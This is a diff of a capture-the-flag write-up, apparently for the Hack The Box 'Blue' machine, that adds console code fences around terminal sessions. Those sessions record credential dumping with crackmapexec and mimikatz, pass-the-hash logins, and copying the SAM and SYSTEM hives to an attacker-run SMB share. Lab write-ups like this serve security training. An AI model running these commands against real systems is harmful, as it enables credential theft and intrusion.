@@ -782,7 +782,7 @@ CME          10.10.10.40:445 HARIS-PC        haris-pc\admin
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
 ```
 
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
 CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
 CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\admin:admin (Pwn3d!)
@@ -792,21 +792,19 @@ CME          10.10.10.40:445 HARIS-PC        Guest:501:aad3b435b51404eeaad3b435b
 CME          10.10.10.40:445 HARIS-PC        haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
 [*] KTHXBYE!
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
+```
 
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
 CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
 CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\Administrator cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
 CME          10.10.10.40:445 HARIS-PC        [+] Executed command 
 CME          10.10.10.40:445 HARIS-PC        haris-pc\administrator
 [*] KTHXBYE!
+```
 
 
-
-
-
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.10.10.40 cmd.exe
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
@@ -841,9 +839,9 @@ Tunnel adapter Teredo Tunneling Pseudo-Interface:
 
 C:\Windows\system32>
 
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
 CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
 CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\Administrator cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
@@ -857,9 +855,9 @@ MIMIKATZ     10.10.10.40                       [*] - - "POST / HTTP/1.1" 200 -
 MIMIKATZ     10.10.10.40                       [*] Saved Mimikatz's output to Mimikatz-10.10.10.40-2021-04-28_212350.log
 [*] KTHXBYE!
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# cat /root/.cme/logs/Mimikatz-10.10.10.40-2021-04-28_212350.log
 
   .#####.   mimikatz 2.1 (x64) built on Jun 28 2016 19:12:18
@@ -961,17 +959,15 @@ SID               : S-1-5-18
 mimikatz(powershell) # exit
 Bye!
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
+```
 
-
-
+```console
 C:\Windows\system32>reg save HKLM\SAM sam.backup
 reg save HKLM\SAM sam.backup
 The operation completed successfully.
-
 C:\Windows\system32>reg save HKLM\SYSTEM system.backup
 reg save HKLM\SYSTEM system.backup
 The operation completed successfully.
-
 C:\Windows\system32>dir sam.backup
 dir sam.backup
  Volume in drive C has no label.
@@ -995,10 +991,10 @@ dir system.backup
                0 Dir(s)  17,188,548,608 bytes free
 
 C:\Windows\system32>
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# impacket-smbserver smbfolder $(pwd)
 Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation
 
@@ -1017,40 +1013,40 @@ Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corpo
 [*] AUTHENTICATE_MESSAGE (\,HARIS-PC)
 [*] User HARIS-PC\ authenticated successfully
 [*] :::00::aaaaaaaaaaaaaaaa
+```
 
-
+```console
 C:\Windows\system32>copy sam.backup \\10.10.14.28\smbfolder\sam
 copy sam.backup \\10.10.14.28\smbfolder\sam
         1 file(s) copied.
-
 C:\Windows\system32>copy system.backup \\10.10.14.28\smbfolder\system
 copy system.backup \\10.10.14.28\smbfolder\system
         1 file(s) copied.
 
 C:\Windows\system32>
+```
 
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# ls -la sam
 -rwxr-xr-x 1 root root 28672 dic 31  1969 sam
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# ls -la system 
 -rwxr-xr-x 1 root root 10608640 dic 31  1969 system
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# pwdump system sam 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
 admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.10.10.40 cmd.exe
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
@@ -1080,9 +1076,9 @@ Tunnel adapter Teredo Tunneling Pseudo-Interface:
    Connection-specific DNS Suffix  . : 
 
 C:\Windows\system32>
+```
 
-
-
+```console
 C:\Windows\system32>whoami /priv
 whoami /priv
 
@@ -1116,8 +1112,9 @@ SeTimeZonePrivilege             Change the time zone                      Enable
 SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
 
 C:\Windows\system32>
+```
 
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# python /opt/impacket/examples/psexec.py WORKGROUP/admin:admin\@10.10.10.40
 Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation
 
@@ -1135,7 +1132,7 @@ C:\Windows\system32>whoami
 nt authority\system
 
 C:\Windows\system32>
-
+```
 
 
 
